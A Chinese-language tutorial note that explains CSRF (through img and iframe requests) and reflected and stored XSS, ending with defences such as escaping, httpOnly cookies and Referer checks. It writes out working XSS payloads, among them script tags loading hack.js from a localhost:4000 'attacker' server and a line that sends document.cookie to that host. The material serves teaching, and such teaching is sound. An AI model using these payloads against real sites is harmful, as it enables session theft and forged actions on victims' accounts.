### 攻击xss,csrf
#### 1. csrf攻击
在其他域名下访问被攻击者之前访问域名下的接口，通过img标签的形式，向同一个服务器发送请求，从而形成攻击。    
例如：A用户访问B（域名：http://www.b.com） 网站，登录成功以后cookie信息已经获取到，B网站发送了一个请求 http://www.b.com/list/delete?id=“11” 这样会删除了id为11的信息。如果攻击者此时利用C页面(http:www.c.com)放了一个img标签，且src=‘http://www.b.com/list/delete?id=“12”’ 这样就会向后端发起删除id为12的信息，起到攻击的作用。 因为C页面的src的链接是b页面的，同一个浏览器下面，不同的窗口，向同一个域发起的请求是共享cookie的，所以此时就像是在b网站发起请求一样，也是携带cookie，服务端认为是合法的，从而把id=12的记录给删除了，起到了攻击的作用。    
或者是在c页面放置一个iframe，iframe的链接是删除链接，此时也是可以起到攻击的作用，而且iframe的这种攻击是用浏览器的请求头里的refer字段无法识别的，因为此时的refer的地址就是iframe的地址，即b页面的地址，所以此时使用refer无效。使用img标签的时候应该是可以使用refer来判断访问的网站的。    

#### 2. xss攻击（跨站脚本攻击），利用注入脚本攻击

##### （1）反射型 - url参数直接注入
①：普通：http://localhost:3000/?from=china      
②：alert尝试：http://localhost:3000/?from=<script>alert(3)</script>    
③：获取Cookie：http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"></script>    
伪造cookie入侵： document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNTY1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="    
直接在4000端口的页面输入脚本：var img = new Image(); img.src='http://localhost:4000/img?c='+document.cookie 就能获取cookie    

##### （2）存储型 - 存储到DB后读取时注入（在输入框，例如评论区输入内容）
评论：<script>alert(1)</script>     
跨站脚本注入：我来了<script src="http://localhost:4000/hack.js"></script>

**防范手段**：
+ ejs转义字符
+ 设置黑名单
+ httpOnly cookie（即cookie不能通过document.cookie的方式获取，只能浏览器请求后台时自动带在头部）
+ Referer验证：Referer指的是页面请求来源。意思是，只接受本站的请求，服务器才做响应；如果不是，就拦截。

> xss：跨站脚本攻击、诱骗用户点击恶意链接<u>盗取用户 cookie</u> 进行攻击、不需要用户进行登录、xss 除了利用 cookie 还可以篡改网页等
>
> csrf：跨站请求伪造、<u>无法获取用户的 cookie</u> 而是<u>直接冒充用户、需要用户登录后进行操作</u>

>通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。
>本质上讲，XSS 是代码注入问题，CSRF 是 HTTP 问题。 XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面(Token验证可以避免)。